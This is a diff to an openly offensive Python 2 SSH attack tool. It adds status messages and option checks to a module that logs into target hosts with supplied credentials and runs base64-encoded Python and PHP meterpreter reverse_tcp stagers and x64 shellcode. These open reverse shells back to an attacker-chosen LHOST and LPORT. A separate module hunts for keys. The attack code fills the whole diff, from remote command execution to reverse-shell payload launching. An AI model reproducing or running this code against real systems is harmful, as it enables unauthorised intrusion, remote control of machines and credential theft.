@@ -10,6 +10,11 @@ import socket
 from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
 import threading
 import time
+import urllib
+import urllib2
+import ssl
+import requests
+import os
 
 CRED = '\033[91m'
 CEND = '\033[0m'
@@ -61,7 +66,7 @@ def workon(ip, username,password, command, timeout):
     except socket.error:
         print CRED + "[-] Failed to connect to " + str(ip) + CEND
     except paramiko.ssh_exception.AuthenticationException:
-        print CRED + "[-] Authentication failed!" + CEND
+        print CRED + "[!] Authentication failed!" + CEND
 
 
 def execute_command(targets, port, username, password, command, timeout):
@@ -91,9 +96,9 @@ exec(d,{'s':s})
 
     ''' % (listen_ip, listen_port)
     payload = base64.b64encode(stager, 'utf-8')
+    print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
     execute_command(ip, port, username, password, "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda"
      " b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &", 5)
-
 
 def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password):
 
@@ -151,6 +156,7 @@ def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password)
 
     ''' % (listen_ip, listen_port)
         payload = base64.b64encode(stager, 'utf-8')
+        print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
         execute_command(ip, port, username, password, "php -r 'eval(base64_decode(\"" + payload + "\"));'", 1)
 
 
@@ -288,10 +294,14 @@ def main():
     if args.module == "keys":
         hunt_keys(targets, args.username, args.password)
     if args.module == "meterpreter":
+        if not args.options:
+            print "The meterpreter module requires options, You must provide an LHOST and LPORT"
+            exit()
         try:
             m_ip = options['LHOST']
         except KeyError:
             print "Must supply an LHOST for use with meterpreter"
+            exit()
         try:
             m_port = options['LPORT']
         except KeyError:
@@ -308,7 +318,7 @@ def main():
             stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password)
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
-            print CGREEN + "Attempting to execute meterpreter shellcode. Handler: " + str(m_ip) + ":" + str(m_port) + CEND
+            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
             execute_command(targets, 22, args.username, args.password, command, 1)
 
 
